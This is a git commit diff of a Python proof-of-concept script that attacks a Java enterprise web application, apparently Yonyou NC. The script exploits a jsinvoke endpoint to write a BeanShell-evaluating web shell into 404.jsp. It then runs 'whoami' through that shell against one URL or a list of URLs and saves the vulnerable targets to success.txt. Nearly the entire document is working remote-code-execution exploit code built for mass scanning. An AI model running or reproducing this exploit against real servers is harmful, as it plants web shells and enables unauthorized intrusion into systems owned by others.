47153791021e5c6a3df30364a86e9e77ccc57281
b3nguang <121670274+b3nguang@users.noreply.github.com>
2023-07-20 22:30:43 +0800

    Update poc.py

--- poc.py
+++ poc.py
@@ -1,76 +1,78 @@
 import argparse
+import logging
+
 import requests
-from time import time
-from urllib.parse import urljoin
 
-print('''
- _    _____                                     
-| |__|___ / _ __   __ _ _   _  __ _ _ __   __ _ 
-| '_ \ |_ \| '_ \ / _` | | | |/ _` | '_ \ / _` |
-| |_) |__) | | | | (_| | |_| | (_| | | | | (_| |
-|_.__/____/|_| |_|\__, |\__,_|\__,_|_| |_|\__, |
-                  |___/                   |___/ 
-脚本，启动！！！！
-''')
+logging.basicConfig(level=logging.INFO, format='%(message)s')
+logger = logging.getLogger(__name__)
 
-def make_request(session, target, path, payload):
-    url = urljoin(target, path)
+
+def perform_exploit(target_url):
+    path_1 = "/uapjs/jsinvoke?action=invoke"
+    path_2 = "/404.jsp?error=bsh.Interpreter"
+
+    payload_1 = {
+        "serviceName": "nc.itf.iufo.IBaseSPService",
+        "methodName": "saveXStreamConfig",
+        "parameterTypes": [
+            "java.lang.Object",
+            "java.lang.String"
+        ],
+        "parameters": [
+            "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
+            "webapps/nc_web/404.jsp"
+        ]
+    }
+    payload_2 = {
+        'cmd': 'org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())',
+    }
+
     try:
-        response = session.get(url, timeout=5, verify=False)
+        response = requests.get(target_url, timeout=5, verify=False)
         if response.status_code == 200:
-            response_1 = session.post(url, json=payload, timeout=5)
+            response_1 = requests.post(url=f"{target_url}{path_1}", json=payload_1, timeout=5)
             if response_1.status_code in [200, 404]:
-                response_2 = session.post(urljoin(target, "/404.jsp?error=bsh.Interpreter"), data=payload, timeout=5)
-                if "出错" not in response_2.text:
+                response_2 = requests.post(url=f"{target_url}{path_2}", data=payload_2, timeout=5)
+                if "<?xml version='1.0' encoding='UTF-8'?>" in response_2.text:
                     return True
-    except requests.RequestException as e:
-        print(f"Error occurred while processing {url}: {e}")
+    except Exception as e:
+        pass
+
     return False
 
-parser = argparse.ArgumentParser()
-parser.add_argument('-f', type=str, default=None, required=False,
-                    help='输入文件路径')
-parser.add_argument('-u', type=str, default=None, required=False,
-                    help='输入url')
-args = parser.parse_args()
 
-urls = []
+def main():
+    parser = argparse.ArgumentParser(description="Script for exploiting vulnerabilities.")
+    parser.add_argument('-f', type=str, default=None, required=False, help='Input file path')
+    parser.add_argument('-u', type=str, default=None, required=False, help='Input URL')
+    args = parser.parse_args()
 
-if args.f:
-    with open(args.f, 'r') as f:
-        lines = f.readlines()
-        urls = [line.strip() for line in lines if not line.startswith('https')]
-elif args.u:
-    urls.append(args.u)
-else:
-    parser.print_help()
-    exit()
+    if not args.f and not args.u:
+        parser.print_help()
+        return
 
-payload = {
-    "serviceName": "nc.itf.iufo.IBaseSPService",
-    "methodName": "saveXStreamConfig",
-    "parameterTypes": [
-        "java.lang.Object",
-        "java.lang.String"
-    ],
-    "parameters": [
-        "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
-        "webapps/nc_web/404.jsp"
-    ]
-}
+    target_urls = []
+    if args.f:
+        with open(args.f, 'r') as f:
+            lines = f.readlines()
+            target_urls = [line.strip() for line in lines if not line.startswith('https')]
+    elif args.u:
+        target_urls.append(args.u)
 
-success_targets = []
-print("[+]任务开始.....")
-start = time()
-
-with requests.Session() as session:
-    for url in urls:
-        if make_request(session, url, "/uapjs/jsinvoke?action=invoke", payload):
+    success_targets = []
+    logger.info("[+]任务开始.....")
+    for url in target_urls:
+        if perform_exploit(url):
             success_targets.append(url)
+            logger.info(f"\033[32;1m[+] success {url}\033[0m")
+        else:
+            logger.info(f"\033[1;34m[*] fail {url}\033[0m")
 
-end = time()
-print('任务完成,用时%ds.' % (end - start))
+    logger.info("任务完成.")
+    with open('success.txt', 'w') as f:
+        for target in success_targets:
+            f.write(target + '\n')
 
-with open('success.txt', 'w') as f:
-    for target in success_targets:
-        f.write(target + '\n')
+
+if __name__ == "__main__":
+    main()
